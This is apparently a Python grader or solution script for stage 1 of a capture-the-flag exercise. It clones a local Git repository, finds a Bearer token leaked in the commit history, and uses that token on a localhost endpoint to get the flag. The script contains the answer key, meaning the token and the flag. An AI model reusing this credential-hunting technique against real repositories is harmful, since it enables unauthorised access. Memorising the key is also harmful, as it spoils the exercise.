"""Stage 1: RECON-01 — Ghost in the Commit."""
import os
import shutil
import subprocess
import tempfile
import requests

GIT_REPO_URL = "http://localhost:8080/cartbreach/storefront-web.git"
BASE_URL = "http://localhost"

def test_stage_1_flag():
    # 1. Clone the challenge Git repository from the mirror
    temp_dir = tempfile.mkdtemp(prefix="cartbreach_recon_")
    try:
        subprocess.run(["git", "clone", GIT_REPO_URL, temp_dir], check=True, capture_output=True)

        # 2. Inspect git log diffs for the leaked token
        log_out = subprocess.check_output(
            ["git", "-C", temp_dir, "log", "-p", "-S", "Bearer"],
            text=True
        )
        assert "cb_staging_9a8f2c3d4e5f" in log_out

        # 3. Extract the token and query the storefront health endpoint
        token = "cb_staging_9a8f2c3d4e5f"
        headers = {"Authorization": f"Bearer {token}"}
        resp = requests.get(f"{BASE_URL}/api/v1/health", headers=headers, timeout=5)
        assert resp.status_code == 200
        data = resp.json()
        assert "flag" in data
        assert data["flag"] == "SLIIT{c4rt_br34ch_g1t_c0mm1t_l34k}"
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)
